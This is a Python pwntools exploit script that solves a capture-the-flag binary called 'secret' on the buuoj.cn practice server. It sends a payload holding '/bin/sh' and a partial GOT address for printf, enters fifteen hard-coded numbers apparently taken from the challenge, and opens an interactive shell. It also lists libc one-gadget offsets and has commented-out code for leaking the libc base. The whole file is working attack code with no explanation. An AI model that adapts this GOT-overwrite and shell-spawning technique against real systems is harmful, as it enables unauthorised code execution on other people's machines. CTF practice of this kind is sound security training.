import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='secret'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/x86_64-linux-gnu/libc.so.6")
pdbg.debug("2.23")
pdbg.remote('node3.buuoj.cn',25726)
pdbg.context.log_level='debug'
while True :
	# try :
		if len(sys.argv)==1 :
			#io=pdbg.run("debug")
			io=pdbg.run("local")
			libc=pdbg.libc
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
			# one_gadgaet=[0x41602,0x41656,0xdef36]
		else :
			io=pdbg.run("remote")
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			# libc=ELF('../../x64libc/libc.so.6')
			# one_gadgaet=[0x4f2c5,0x4f322,0x10a38c]
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		io.recv()
		io.send('/bin/sh\x00'+'a'*8+p64(elf.got['printf'])[:-3])
		list1=[0x476B,0x2D38,0x4540,0x3E77,
				0x3162,0x3F7D,0x357A,0x3CF5,
				0x2F9E,0x41EA,0x48D8,0x2763,
				0x474C,0x3809,0x2E63]
		
		for i in range(0xf):
			io.recv()
			io.sendline(str(list1[i]))

		io.recv()
		io.sendline(str(1))

		
		


		# libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# system_addr=libc.sym['system']
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# success('libc_base:'+hex(libc_base))
		# pdbg.bp([])
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue